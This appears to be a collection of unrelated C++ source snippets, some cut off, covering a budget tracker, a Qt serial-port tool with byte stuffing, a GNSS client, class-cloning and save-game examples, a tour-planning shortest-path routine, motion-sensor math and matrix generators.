groceryExpenses;\n\n    std::cout << std::fixed << \"Your spare change is... $\" << runningBalance << \"\\n Please enter [y] to do another budget, or [n] to exit the program.\\n\";\n    std::cin >> pause;\n    if (pause == \"n\") // Pragmatic operator. Allows for ONLY the character 'n' to close the program. \n    {\n      keepRunning = false;\n    }\n  }\n}\n\n\n\n\n\nint main() // Main function. Every c++ program needs this\n{\n  budgetTracker(); // Calling the budgetTracker() function we made\n}\n",
    "#include \"mainwindow.h\"\n#include \"./ui_mainwindow.h\"\n#include <QtSerialPort/QSerialPortInfo>\n#include <QSerialPort>\n#include <QTimer>\n\nQSerialPort *serialPort1;\nQSerialPort *serialPort2;\n\nMainWindow::MainWindow(QWidget *parent)\n    : QMainWindow(parent)\n    , ui(new Ui::MainWindow)\n{\n    ui->setupUi(this);\n\n    serialPort1 = new QSerialPort(this);\n    serialPort2 = new QSerialPort(this);\n\n\n    updateComPortList(ui->comboBoxComPort1, ui->comboBoxComPort2);\n    populateParityOptions(ui ->comboBoxParity1);\n    populateParityOptions(ui->comboBoxParity2);\n\n    connect(ui->pushButtonSend1, &QPushButton::clicked, this, &MainWindow::sendDataFromPort1);\n    connect(ui->pushButtonSend2, &QPushButton::clicked, this, &MainWindow::sendDataFromPort2);\n\n    connect(serialPort1, &QSerialPort::readyRead, this, &MainWindow::readDataFromPort1);\n    connect(serialPort2, &QSerialPort::readyRead, this, &MainWindow::readDataFromPort2);\n\n    connect(ui->comboBoxComPort1, QOverload<int>::of(&QComboBox::currentIndexChanged), this, &MainWindow::configurePort1);\n    connect(ui->comboBoxComPort2, QOverload<int>::of(&QComboBox::currentIndexChanged), this, &MainWindow::configurePort2);\n\n}\n\nvoid MainWindow::updateComPortList(QComboBox *comboBoxComPort1, QComboBox *comboBoxComPort2) {\n    comboBoxComPort1->clear();\n    comboBoxComPort2->clear();\n\n    const auto ports = QSerialPortInfo::availablePorts();\n\n    if (ports.size() == 2) {\n        comboBoxComPort1->addItem(ports[0].portName());\n        comboBoxComPort2->addItem(ports[1].portName());\n        comboBoxComPort1->setEnabled(false);\n        comboBoxComPort2->setEnabled(false);\n    } else {\n        for (const QSerialPortInfo &port : ports) {\n            QString portName = port.portName();\n            comboBoxComPort1->addItem(portName);\n            comboBoxComPort2->addItem(portName);\n        }\n        comboBoxComPort1->setEnabled(true);\n        comboBoxComPort2->setEnabled(true);\n    }\n}\n\nvoid MainWindow::populateParityOptions(QComboBox *comboBoxParity) {\n    comboBoxParity->clear();\n\n    comboBoxParity->addItem(\"No Parity\", QSerialPort::NoParity);\n    comboBoxParity->addItem(\"Even Parity\", QSerialPort::EvenParity);\n    comboBoxParity->addItem(\"Odd Parity\", QSerialPort::OddParity);\n    comboBoxParity->addItem(\"Mark Parity\", QSerialPort::MarkParity);\n    comboBoxParity->addItem(\"Space Parity\", QSerialPort::SpaceParity);\n}\n\nQByteArray applyByteStuffing(const QByteArray& data) {\n    QByteArray stuffedData;\n    char ESC = 0x1B; // \u0421\u0438\u043c\u0432\u043e\u043b \u0434\u043b\u044f \u044d\u043a\u0440\u0430\u043d\u0438\u0440\u043e\u0432\u0430\u043d\u0438\u044f\n    char FLAG = '$'; // \u0424\u043b\u0430\u0433 \u043d\u0430\u0447\u0430\u043b\u0430 \u043f\u0430\u043a\u0435\u0442\u0430\n\n    for (char byte : data) {\n        if (byte == ESC || byte == FLAG) {\n            stuffedData.append(ESC);  // \u0414\u043e\u0431\u0430\u0432\u043b\u044f\u0435\u043c ESC \u043f\u0435\u0440\u0435\u0434 \u0443\u043f\u0440\u0430\u0432\u043b\u044f\u044e\u0449\u0438\u043c\u0438 \u0441\u0438\u043c\u0432\u043e\u043b\u0430\u043c\u0438\n        }\n        stuffedData.append(byte);  // \u0414\u043e\u0431\u0430\u0432\u043b\u044f\u0435\u043c \u0441\u0430\u043c \u0431\u0430\u0439\u0442\n    }\n\n    return stuffedData;\n}\n\nQByteArray removeByteStuffing(const QByteArray& stuffedData, QList<int>& modifiedIndices) {\n    QByteArray unstuffedData;\n    char ESC = 0x1B;  // \u041f\u0440\u0435\u0434\u043f\u043e\u043b\u043e\u0436\u0438\u043c, \u0447\u0442\u043e \u0441\u0438\u043c\u0432\u043e\u043b \u044d\u043a\u0440\u0430\u043d\u0438\u0440\u043e\u0432\u0430\u043d\u0438\u044f - 0x1B\n    bool isEscaped = false;\n\n    for (int i = 0; i < stuffedData.size(); ++i) {\n        char byte = stuffedData[i];\n\n        if (isEscaped) {\n            modifiedIndices.append(i - 1);  // \u0421\u043e\u0445\u0440\u0430\u043d\u044f\u0435\u043c \u0438\u043d\u0434\u0435\u043a\u0441 \u044d\u043a\u0440\u0430\u043d\u0438\u0440\u0443\u044e\u0449\u0435\u0433\u043e \u0431\u0430\u0439\u0442\u0430\n            unstuffedData.append(byte);  // \u0414\u043e\u0431\u0430\u0432\u043b\u044f\u0435\u043c \u044d\u043a\u0440\u0430\u043d\u0438\u0440\u043e\u0432\u0430\u043d\u043d\u044b\u0439 \u0431\u0430\u0439\u0442\n            isEscaped = false;  // \u0421\u0431\u0440\u0430\u0441\u044b\u0432\u0430\u0435\u043c \u0444\u043b\u0430\u0433 \u044d\u043a\u0440\u0430\u043d\u0438\u0440\u043e\u0432\u0430\u043d\u0438\u044f\n        } else if (byte == ESC) {\n            isEscaped = true;  // \u0423\u0441\u0442\u0430\u043d\u0430\u0432\u043b\u0438\u0432\u0430\u0435\u043c \u0444\u043b\u0430\u0433 \u044d\u043a\u0440\u0430\u043d\u0438\u0440\u043e\u0432\u0430\u043d\u0438\u044f\n        } else {\n            unstuffedData.append(byte);  // \u0414\u043e\u0431\u0430\u0432\u043b\u044f\u0435\u043c \u043e\u0431\u044b\u0447\u043d\u044b\u0439 \u0431\u0430\u0439\u0442\n        }\n    }\n\n    return unstuffedData;\n}\n\nvoid MainWindow::configurePort1() {\n    QString portName = ui->comboBoxComPort1->currentText();\n    serialPort1->setPortName(portName);\n    serialPort1->setBaudRate(QSerialPort::Baud9600);\n    serialPort1->setParity(static_cast<QSerialPort::Parity>(ui->comboBoxParity1->currentData().toInt()));\n    if (serialPort1->isOpen()) {\n        serialPort1->close();\n    }\n    serialPort1->open(QIODevice::ReadWrite);\n}\n\nvoid MainWindow::configurePort2() {\n    QString portName = ui->comboBoxComPort2->currentText();\n    serialPort2->setPortName(portName);\n    serialPort2->setBaudRate(QSerialPort::Baud9600);\n    serialPort2->setParity(static_cast<QSerialPort::Parity>(ui->comboBoxParity2->currentData().toInt()));\n    if (serialPort2->isOpen()) {\n        serialPort2->close();\n    }\n    serialPort2->open(QIODevice::ReadWrite);\n\n}\n\nvoid MainWindow::readDataFromPort1() {\n    if (serialPort1->isOpen()) {\n        QByteArray stuffedData = serialPort1->readAll();\n\n        if (!stuffedData.isEmpty()) {\n            ui->textEditOutput1->clear();\n\n            QList<int> modifiedIndices;\n            QByteArray unstuffedData = removeByteStuffing(stuffedData, modifiedIndices);\n\n            QString frameInfo = \"\u041f\u0440\u0438\u043d\u044f\u0442\u044b\u0439 \u043a\u0430\u0434\u0440 (\u0434\u043e \u0434\u0435\u0431\u0430\u0439\u0442-\u0441\u0442\u0430\u0444\u0444\u0438\u043d\u0433\u0430):\\n\";\n            for (int i = 0; i < stuffedData.size(); ++i) {\n                if (modifiedIndices.contains(i)) {\n                    frameInfo += QString(\"<",
    "/* Copyright (c) 2017-2020, The Linux Foundation. All rights reserved.\n *\n * Redistribution and use in source and binary forms, with or without\n * modification, are permitted provided that the following conditions are\n * met:\n *     * Redistributions of source code must retain the above copyright\n *       notice, this list of conditions and the following disclaimer.\n *     * Redistributions in binary form must reproduce the above\n *       copyright notice, this list of conditions and the following\n *       disclaimer in the documentation and/or other materials provided\n *       with the distribution.\n *     * Neither the name of The Linux Foundation, nor the names of its\n *       contributors may be used to endorse or promote products derived\n *       from this software without specific prior written permission.\n *\n * THIS SOFTWARE IS PROVIDED \"AS IS\" AND ANY EXPRESS OR IMPLIED\n * WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF\n * MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NON-INFRINGEMENT\n * ARE DISCLAIMED.  IN NO EVENT SHALL THE COPYRIGHT OWNER OR CONTRIBUTORS\n * BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR\n * CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF\n * SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR\n * BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY,\n * WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE\n * OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN\n * IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.\n *\n */\n\n#define LOG_NDEBUG 0\n#define LOG_TAG \"LocSvc_GnssAPIClient\"\n#define SINGLE_SHOT_MIN_TRACKING_INTERVAL_MSEC (590 * 60 * 60 * 1000) // 590 hours\n\n#include <inttypes.h>\n#include <log_util.h>\n#include <loc_cfg.h>\n\n#include \"LocationUtil.h\"\n#include \"GnssAPIClient.h\"\n#include <LocContext.h>\n\nnamespace android {\nnamespace hardware {\nnamespace gnss {\nnamespace V2_1 {\nnamespace implementation {\n\nusing ::android::hardware::gnss::V2_1::IGnss;\nusing ::android::hardware::gnss::V2_1::IGnssCallback;\nusing ::android::hardware::gnss::V1_0::IGnssNiCallback;\nusing ::android::hardware::gnss::V2_0::GnssLocation;\n\nstatic void convertGnssSvStatus(GnssSvNotification& in, V1_0::IGnssCallback::GnssSvStatus& out);\nstatic void convertGnssSvStatus(GnssSvNotification& in,\n        hidl_vec<V2_0::IGnssCallback::GnssSvInfo>& out);\nstatic void convertGnssSvStatus(GnssSvNotification& in,\n        hidl_vec<V2_1::IGnssCallback::GnssSvInfo>& out);\n\nGnssAPIClient::GnssAPIClient(const sp<V1_0::IGnssCallback>& gpsCb,\n        const sp<V1_0::IGnssNiCallback>& niCb) :\n    LocationAPIClientBase(),\n    mGnssCbIface(nullptr),\n    mGnssNiCbIface(nullptr),\n    mControlClient(new LocationAPIControlClient()),\n    mLocationCapabilitiesMask(0),\n    mLocationCapabilitiesCached(false),\n    mTracking(false),\n    mGnssCbIface_2_0(nullptr)\n{\n    LOC_LOGD(\"%s]: (%p %p)\", __FUNCTION__, &gpsCb, &niCb);\n\n    initLocationOptions();\n    gnssUpdateCallbacks(gpsCb, niCb);\n}\n\nGnssAPIClient::GnssAPIClient(const sp<V2_0::IGnssCallback>& gpsCb) :\n    LocationAPIClientBase(),\n    mGnssCbIface(nullptr),\n    mGnssNiCbIface(nullptr),\n    mControlClient(new LocationAPIControlClient()),\n    mLocationCapabilitiesMask(0),\n    mLocationCapabilitiesCached(false),\n    mTracking(false),\n    mGnssCbIface_2_0(nullptr)\n{\n    LOC_LOGD(\"%s]: (%p)\", __FUNCTION__, &gpsCb);\n\n    initLocationOptions();\n    gnssUpdateCallbacks_2_0(gpsCb);\n}\n\nGnssAPIClient::GnssAPIClient(const sp<V2_1::IGnssCallback>& gpsCb) :\n    LocationAPIClientBase(),\n    mGnssCbIface(nullptr),\n    mGnssNiCbIface(nullptr),\n    mControlClient(new LocationAPIControlClient()),\n    mLocationCapabilitiesMask(0),\n    mLocationCapabilitiesCached(false),\n    mTracking(false),\n    mGnssCbIface_2_1(nullptr)\n{\n    LOC_LOGD(\"%s]: (%p)\", __FUNCTION__, &gpsCb);\n\n    initLocationOptions();\n    gnssUpdateCallbacks_2_1(gpsCb);\n}\n\nGnssAPIClient::~GnssAPIClient()\n{\n    LOC_LOGD(\"%s]: ()\", __FUNCTION__);\n    if (mControlClient) {\n        delete mControlClient;\n        mControlClient = nullptr;\n    }\n}\n\nvoid GnssAPIClient::initLocationOptions()\n{\n    // set default LocationOptions.\n    memset(&mTrackingOptions, 0, sizeof(TrackingOptions));\n    mTrackingOptions.size = sizeof(TrackingOptions);\n    mTrackingOptions.minInterval = 1000;\n    mTrackingOptions.minDistance = 0;\n    mTrackingOptions.mode = GNSS_SUPL_MODE_STANDALONE;\n}\n\nvoid GnssAPIClient::setCallbacks()\n{\n    LocationCallbacks locationCallbacks;\n    memset(&locationCallbacks, 0, sizeof(LocationCallbacks));\n    locationCallbacks.size = sizeof(LocationCallbacks);\n\n    locationCallbacks.trackingCb = nullptr;\n    locationCallbacks.trackingCb = [this](Location location) {\n        onTrackingCb(location);\n    };\n\n    locationCallbacks.batchingCb = nullptr;\n    locationCallbacks.geofenceBreachCb = nullptr;\n    locationCallbacks.geofenceStatusCb = nullptr;\n    locationCallbacks.gnssLocationInfoCb = nullptr;\n    locationCallbacks.gn",
    "#include <iostream>\r\n#include <string.h>\r\n\r\nusing namespace std;\r\n\r\nclass Persona\r\n{\r\n    public:\r\n        Persona(char const *nom_param) { strcpy(nombre, nom_param); }\r\n        Persona(const Persona& p)\r\n            { strcpy(nombre, p.nombre); cout << \"Per: constructor copia.\" << endl; }\r\n        virtual ~Persona() { ; }\r\n        virtual void VerNombre() { cout << nombre << endl; }\r\n        virtual Persona* Clonar() { return new Persona(*this); }\r\n    protected:\r\n        char nombre[30];\r\n};\r\n\r\nclass Empleado : public Persona\r\n{\r\n    public:\r\n        Empleado(char const *nom_param) : Persona(nom_param) {}\r\n        Empleado(const Empleado &e) : Persona(e)\r\n            { cout << \"Emp: constructor copia.\" << endl; }\r\n        void VerNombre() { cout << \"Emp: \" << nombre << endl; }\r\n        virtual Persona* Clonar() { return new Empleado(*this); }\r\n};\r\n\r\nclass Estudiante : public Persona\r\n{\r\n    public:\r\n        Estudiante(char const *nom_param) : Persona(nom_param) {}\r\n        Estudiante(const Estudiante &e) : Persona(e)\r\n            { cout << \"Est: constructor copia.\" << endl; }\r\n        virtual void VerNombre() { cout << \"Est: \" << nombre << endl; }\r\n        virtual Persona* Clonar() { return new Estudiante(*this); }\r\n};\r\n\r\nint main()\r\n{\r\n   Persona *Pepito = new Estudiante(\"Jose\");\r\n   Persona *Carlos = new Empleado(\"Carlos\");\r\n   Persona *Gente[2];\r\n   // Estudiante Nueva(*Pepito);     // muy rebuscado\r\n\r\n   Carlos->VerNombre();\r\n   Pepito->VerNombre();\r\n\r\n   Gente[0] = Carlos->Clonar();\r\n   Gente[0]->VerNombre();\r\n\r\n   Gente[1] = Pepito->Clonar();\r\n   Gente[1]->VerNombre();\r\n\r\n   delete Pepito;\r\n   delete Carlos;\r\n   delete Gente[0];\r\n   delete Gente[1];\r\n\r\n   return 0;\r\n}\r\n",
    "#include <math.h>\n#include <iostream>\n#include <fstream>\n#include <string>\n\n#include \"header_creation_jeu.h\"\n#include \"header_gestion_plateau.h\"\n#include \"header_gestion_pieces.h\"\n\n\nchar BitsToChar(int nb_bit, bool chaine[])\n{\n    int rien=0;\n    for (int i=0;\n        i!=nb_bit;\n        i++)\n    {\n        if (chaine[i]==true)\n        {\n        \trien += pow (2, nb_bit-1-i);\n            //std::cout << rien << std::endl;;\n        }\n    }\n    //std::cout << rien;\n    return rien;\n}\n\nvoid intToBits(int nb_bit, bool chaine[], int nombre, int depart)\n{\n    for (int i=0;\n         i!=nb_bit;\n         i++)\n    {\n        int puissance2=pow (2, nb_bit-1-i);\n        if (nombre-puissance2>=0)\n        {\n            nombre-=puissance2;\n            chaine[i+depart]=true;\n        }\n        else\n        {\n            chaine[i+depart]=false;\n        }\n    }\n}\n\nvoid CharToBits(int nb_bit, bool chaine[], char unChar)\n{\n    int a=unChar;\n    //std::cout << a;\n    for (int i=0;\n         i!=nb_bit;\n         i++)\n    {\n        int puissance2=pow(2, nb_bit-1-i);\n        if (a-puissance2>=0)\n        {\n            a-=puissance2;\n            chaine[i]=true;\n        }\n        else\n        {\n            chaine[i]=false;\n        }\n    }\n}\n\nint BitsToInt(int nb_bit, bool chaine[])\n{\n\tint leInt=0;\n    for (int i=0;\n        i!=nb_bit;\n        i++)\n    {\n        if (chaine[i])\n        {\n            leInt+=pow(2,((nb_bit-1))-i);\n        }\n    }\n\treturn leInt;\n}\n\nvoid sauvegarde(Joueur tableau_joueur[], int nb_joueur)\n{\n    std::string sauvegarde=\"\";\n    bool tout[256];\n    for (int i=0;\n         i!=nb_joueur;\n         i++)\n    {\n        for (int k=0;\n             k!=21;\n             k++)\n        {\n            tableau_joueur[i].rotations_pieces[k]=tableau_joueur[i].rotations_pieces[k]%4;\n        }\n    }\n\n    //cr\u00e9ation de la chaine qui stockera TOUTES les informations pour recharger la partie\n\n    for (int unjoueur=0;\n         unjoueur!=nb_joueur;\n         unjoueur++) //on sauvegarde pour n joueur\n    {\n        //sauvegarde du nom sur 11 caract\u00e8res\n        for (int k=0; k!=11; k++)\n        {\n            sauvegarde.push_back(tableau_joueur[unjoueur].pseudo[k]);\n        }\n\n        //sauvegarde de la position de toutes les pi\u00e8ces\n\n        for (int piece=0; //on sauvegarde chaque pi\u00e8ce\n             piece!=21;\n             piece++)\n        {\n            //position x\n\n            intToBits(5, tout, tableau_joueur[unjoueur].positions_x[piece], piece*12+0);\n\n            //position y\n            intToBits(5, tout, tableau_joueur[unjoueur].positions_y[piece], piece*12+5);\n\n//            std::cout << \"position y :\" <<  tableau_joueur[unjoueur].positions_y[piece];\n//            std::cout << tout[piece*12+5];\n//            std::cout << tout[piece*12+1+5];\n//            std::cout << tout[piece*12+2+5];\n//            std::cout << tout[piece*12+3+5];\n//            std::cout << tout[piece*12+4+5];\n//            std::cout << std::endl;\n\n            //rotation\n            intToBits(2, tout, tableau_joueur[unjoueur].rotations_pieces[piece], piece*12+10);\n        }\n\n        //on convertit chaque 8 bits en UN caract\u00e8re\n        for (int byte=0; byte!=31; byte++)\n        {\n            bool chaine[8];\n            for (int i=0; i!=8; i++) //on remplit un octet avant de le convertir\n            {\n                chaine[i]=tout[byte*8+i];\n                std::cout << byte*8+i;\n                //std::cout << chaine[i];\n            }\n            std::cout << std::endl;\n            sauvegarde.push_back(BitsToChar(8, chaine));\n        }\n\n        //le 32\u00e8me octet \u00e9tant coup\u00e9, on le traite s\u00e9parr\u00e9ment\n        bool chaine[8];\n\n//        for (int i=0; i!=8; i++)\n//        {\n//            if (i<4)\n//                chaine[i]=tout[31*8+i];\n\n//            else\n//                chaine[i]=false;\n//        }\n\n        sauvegarde.push_back(BitsToChar(8, chaine));\n\n\n    }\n\n    std::ofstream Fichier(\"data.txt\", std::ios_base::binary);\n    Fichier << sauvegarde;\n    Fichier.close();\n}\n\nvoid charger(char tableau_des_pieces[21][5][5], Joueur tableau_joueurs[], char le_plateau_jeu[DIMENSION][DIMENSION])\n{\n    std::ifstream Fichier(\"data.txt\", std::ios_base::binary);\n    std::string Tout=\"\";\n    std::getline (Fichier, Tout);\n\n    //on sait que chaque joueur est enregistr\u00e9 sur 43 octets, on peut donc assez simplement r\u00e9cup\u00e9rer le nombre de joueur\n    int nb_joueur = Tout.size()/43;\n    init_tableau_joueurs_fixe(tableau_joueurs, nb_joueur);\n\n    //on r\u00e9cup\u00e8re toutes les informations pour tout les joueurs\n\n    for (int joueur=0;\n         joueur!=nb_joueur;\n         joueur++)\n    {\n        // r\u00e9cup\u00e9ration du nom\n        for (int i=0;\n             i!=11;\n             i++)\n        {\n            tableau_joueurs[joueur].pseudo.push_back(Tout[joueur*43+i]);\n        }\n\n        //on r\u00e9cup\u00e8re les informations relatives au pi\u00e8ces pour le joueur\n        //std::string infoPiece=\"\";\n        bool chaineBits[256];\n\n        for (int i=0;\n             i!=32;\n             i++)\n        {\n            bool chaineTemp[",
    "//\uff085\uff09\u6e38\u89c8\u89c4\u5212\uff1a\u53ef\u4ee5\u4ee5\u67d0\u4e2a\u666f\u70b9\u4e3a\u8d77\u70b9\uff0c\u7efc\u5408\u8003\u8651\u65f6\u95f4\u3001\u8ddd\u79bb\u7b49\u63a8\u8350\u5168\u7a0b\u6e38\u89c8\u65b9\u6848\u3002\n#include <iostream>\n#include <cstdio>\n#include \"Base.h\"\n#include \"Graph.h\"\nusing namespace std;\n\nvoid Average(Graph G, int P)\n{\n    if (P >= 1 && P <= 6)\n    {\n        bool S[MAX];\n        int D[MAX];\n        int Path[MAX];\n        int v, w, i, min;\n        for (v = 1; v <= G.vexnum; ++v)\n        {\n            S[v] = false;\n            D[v] = G.arcs[P][v].Cost * 0.3 + G.arcs[P][v].Length * 0.7;\n            if (D[v] < MaxInt)\n                Path[v] = P;\n            else\n                Path[v] = -1;\n        }\n        S[P] = true;\n        D[P] = 0;\n        for (i = 1; i < G.vexnum; ++i)\n        {\n            min = MaxInt;\n            for (w = 1; w <= G.vexnum; ++w)\n            {\n                if (!S[w] && D[w] < min)\n                {\n                    v = w;\n                    min = D[w];\n                }\n            }\n            S[v] = true;\n            for (w = 1; w <= G.vexnum; ++w)\n            {\n                if (!S[w] && (D[v] + G.arcs[v][w].Cost * 0.3 + G.arcs[v][w].Length * 0.7 < D[w]))\n                {\n                    D[w] = D[v] + G.arcs[v][w].Cost * 0.3 + G.arcs[v][w].Length * 0.7;\n                    Path[w] = v;\n                }\n            }\n        }\n        char Name[20][20];\n        char Tem[100];\n        FILE* fp;\n        fopen_s(&fp, \"E:\\\\OneDrive\\\\\u684c\u9762\\\\VS2022\\\\Report\\\\Report\\\\Name for Advise.txt\", \"r\");\n        if (!fp)\n            cout << \"\u65e0\u6cd5\u6b63\u786e\u6253\u5f00\u6587\u4ef6.\";\n        else\n        {\n            int i = 1;\n            while (fgets(Tem, sizeof(Tem), fp) != NULL)\n            {\n                for (int x = 0; x < 20; x++)\n                {\n                    int temporary = Tem[x];\n                    Name[i][x] = temporary;\n                }\n                //sscanf_s(Tem[x], \"%c\", Name[i][x]);\n                for (int j = 0; j < 20; j++)    //\u6e05\u7a7a\n                    Tem[j] = '\\0';\n                i++;\n            }\n        }\n\n        fclose(fp);\n        int temmin = 6666;\n        int tem;\n        for (int j = 1; j <= G.vexnum; j++)\n        {\n            for (int i = 1; i <= G.vexnum; i++)\n            {\n                if (temmin > D[i])\n                {\n                    temmin = D[i];\n                    tem = i;\n                }\n            }\n            for(int y=0;Name[tem][y]!='\\n'&&Name[tem][y]!='\\0';y++)\n                cout << Name[tem][y];\n            D[tem] = 6666;\n            temmin = 6666;\n            if (j != G.vexnum)\n                cout << \"-->\";\n            else\n                cout << endl;\n        }\n\n    }\n    else\n        cout << \"\u8bf7\u8f93\u5165\u6b63\u786e\u7684\u6570\u5b57\uff01\" << endl;\n}\n\nvoid Tour_Planning()\n{\n    Graph G;\n    int P;\n    cout << \"\u8bf7\u8f93\u5165\u8d77\u59cb\u8d77\u70b9\uff081~6\uff09\uff1a\";cin >> P;\n    if (P < 1 || P> 6)\n    {\n        cout << \"\u8f93\u5165\u6570\u5b57\u6709\u8bef\uff01\" << endl;\n        return;\n    }\n    CreateGraph(G);\n    Average(G, P);\n}\n\n\n",
    "#include \"mpucalc.h\"\nvoid MPU6050CALC::clock()\n{\n    getLock();\n    float g = 9.81;\n    short rax, ray, raz, rgx, rgy, rgz;\n    getMotion6(&rax, &ray, &raz, &rgx, &rgy, &rgz);\n\n    acc_x = rax / 8192.0 * g;\n    acc_y = ray / 8192.0 * g;\n    acc_z = raz / 8192.0 * g;\n    forward_vel = acc_y * deltaT;\n\n    ang_x += rgx / 131.0 * deltaT;\n    ang_y += rgy / 131.0 * deltaT;\n    ang_z += rgz / 131.0 * deltaT;\n\n    double R[3][3];\n    R[0][0] = cos(ang_y) * cos(ang_z);\n    R[0][1] = cos(ang_z) * sin(ang_x) * sin(ang_y) - cos(ang_x) * sin(ang_z);\n    R[0][2] = sin(ang_x) * sin(ang_z) + cos(ang_x) * cos(ang_z) * sin(ang_y);\n    R[1][0] = cos(ang_y) * sin(ang_z);\n    R[1][1] = cos(ang_x) * cos(ang_z) + sin(ang_x) * sin(ang_y) * sin(ang_z);\n    R[1][2] = cos(ang_x) * sin(ang_y) * sin(ang_z) - cos(ang_z) * sin(ang_x);\n    R[2][0] = -sin(ang_y);\n    R[2][1] = cos(ang_y) * sin(ang_x);\n    R[2][2] = cos(ang_x) * cos(ang_y);\n\n    double global_accel_x = R[0][0] * acc_x + R[0][1] * acc_y + R[0][2] * acc_z;\n    double global_accel_y = R[1][0] * acc_x + R[1][1] * acc_y + R[1][2] * acc_z;\n    double global_accel_z = R[2][0] * acc_x + R[2][1] * acc_y + R[2][2] * acc_z;\n\n    vel_x += global_accel_x * deltaT;\n    vel_y += global_accel_y * deltaT;\n    vel_z += global_accel_z * deltaT;\n\n    x += vel_x * deltaT;\n    y += vel_y * deltaT;\n    z += vel_z * deltaT;\n    freeLock();\n}\nvoid MPU6050CALC::getAcc(double* x, double* y, double* z)\n{\n    getLock();\n    *x = acc_x;\n    *y = acc_y;\n    *z = acc_z;\n    freeLock();\n}\nvoid MPU6050CALC::getVel(double* x, double* y, double* z)\n{\n    getLock();\n    *x = vel_x;\n    *y = vel_y;\n    *z = vel_z;\n    freeLock();\n}\nvoid MPU6050CALC::getAng(double* x, double* y, double* z)\n{\n    getLock();\n    *x = ang_x;\n    *y = ang_y;\n    *z = ang_z;\n    freeLock();\n}\nvoid MPU6050CALC::getForwardVelocity(double* v)\n{\n    getLock();\n    *v = forward_vel;\n    freeLock();\n}",
    "#include <iostream>\r\n#include <vector>\r\n#include <iomanip>\r\n#include <cmath>\r\n#include <time.h>\r\n\r\nusing namespace std;\r\n\r\nvoid CreateRandomMatrix(vector<vector<double>>& matrix, int SizeOfUnknown)\r\n{\r\n\tdouble input;\r\n\tfor(int i=0; i<matrix.size();++i)\r\n\t\tfor (int j=0; j<matrix.size() + SizeOfUnknown; ++j)\r\n\t\t{\r\n\t\t\t\tinput = rand();\r\n\t\t\t\tmatrix[i].push_back(input);\r\n\t\t}\r\n}\r\n\r\nvoid CreateRandomMatrixWithDiagonalDominance(vector<vector<double>>& matrix, int SizeOfUnknown)\r\n{\r\n\tdouble input;\r\n\tfor (int i = 0; i < matrix.size(); ++i)\r\n\t{\r\n\t\tfor (int j = 0; j < matrix.size() + SizeOfUnknown; ++j)\r\n\t\t{\r\n\t\t\tinput = rand();\r\n\t\t\tmatrix[i].push_back(input);\r\n\t\t}\r\n\t\tfor (int j = 0; j < matrix.size(); ++j)\r\n\t\t\tif (i != j)\r\n\t\t\t\tmatrix[i][i] += matrix[i][j];\r\n\t}\r\n}\r\n\r\nvoid CreateRandomMatrixWithDiagonalDominanceDividedBy100(vector<vector<double>>& matrix, int SizeOfUnknown)\r\n{\r\n\tdouble input;\r\n\tfor (int i = 0; i < matrix.size(); ++i)\r\n\t{\r\n\t\tfor (int j = 0; j < matrix.size() + SizeOfUnknown; ++j)\r\n\t\t{\r\n\t\t\tinput = rand();\r\n\t\t\tmatrix[i].push_back(input/100);\r\n\t\t}\r\n\t\tfor (int j = 0; j < matrix.size(); ++j)\r\n\t\t\tif (i != j)\r\n\t\t\t\tmatrix[i][i] += matrix[i][j];\r\n\t}\r\n}\r\n\r\nvoid CreateOwnMatrix(vector<vector<double>>& matrix, int SizeOfUnknown, int Accuracy)\r\n{\r\n\tdouble input;\r\n\tcout << \"\u0412\u0432\u0435\u0434\u0438\u0442\u0435 \u0432\u0441\u044e \u0434\u043e\u043f\u043e\u043b\u043d\u0435\u043d\u0443\u044e \u043c\u0430\u0442\u0440\u0438\u0446\u0443 \u043f\u043e\u0441\u0442\u0440\u043e\u0447\u043d\u043e(\u043d\u0435 \u043c\u0435\u043d\u0435\u0435 \u0437\u0430\u0434\u0430\u043d\u043d\u043e\u0439 \u0442\u043e\u0447\u043d\u043e\u0441\u0442\u0438): \\n\";\r\n\tfor(int i=0; i<matrix.size(); ++i)\r\n\t\tfor (int j = 0; j < matrix.size() + SizeOfUnknown; ++j)\r\n\t\t{\r\n\t\t\tdo {\r\n\t\t\t\tcin >> input;\r\n\t\t\t} while ((abs(input) < 5*pow(10, -Accuracy-1))&&(input!=0));\r\n\t\t\tmatrix[i].push_back(round(input*pow(10,Accuracy))/pow(10,Accuracy));\r\n\t\t}\r\n}\r\n\r\nvoid CreateOwnFractionMatrix(vector<vector<double>>& matrix, int SizeOfUnknown, int Accuracy)\r\n{\r\n\tdouble Numerator, Denominator;\r\n\tcout << \"\u0412\u0432\u0435\u0434\u0438\u0442\u0435 \u0432\u0441\u044e \u0434\u043e\u043f\u043e\u043b\u043d\u0435\u043d\u0443\u044e \u043c\u0430\u0442\u0440\u0438\u0446\u0443 \u043f\u043e\u0441\u0442\u0440\u043e\u0447\u043d\u043e, \u043f\u0435\u0440\u0432\u044b\u043c \u0432\u0432\u043e\u0434\u0438\u0442\u0441\u044f \u0447\u0438\u0441\u043b\u0438\u0442\u0435\u043b\u044c, \u0437\u0430\u0442\u0435\u043c \u0437\u043d\u0430\u043c\u0435\u043d\u0430\u0442\u0435\u043b\u044c(\u043d\u0435 \u043c\u0435\u043d\u0435\u0435 \u0437\u0430\u0434\u0430\u043d\u043d\u043e\u0439 \u0442\u043e\u0447\u043d\u043e\u0441\u0442\u0438): \\n\";\r\n\tfor (int i = 0; i < matrix.size(); ++i)\r\n\t\tfor (int j = 0; j < matrix.size() + SizeOfUnknown; ++j)\r\n\t\t{\r\n\t\t\t\tcin >> Numerator>>Denominator;\r\n\t\t\tmatrix[i].push_back(round(Numerator/Denominator * pow(10, Accuracy)) / pow(10, Accuracy));\r\n\t\t}\r\n}\r\n\r\nvoid CreateOwnMatrixByFormula(vector<vector<double>>& matrix, int SizeOfUnknown, int Accuracy)   //   a=1/i+j-1\r\n{\r\n\tfor (double i = 0; i < matrix.size(); ++i)\r\n\t{\r\n\t\tfor (double j = 0; j < matrix.size() + 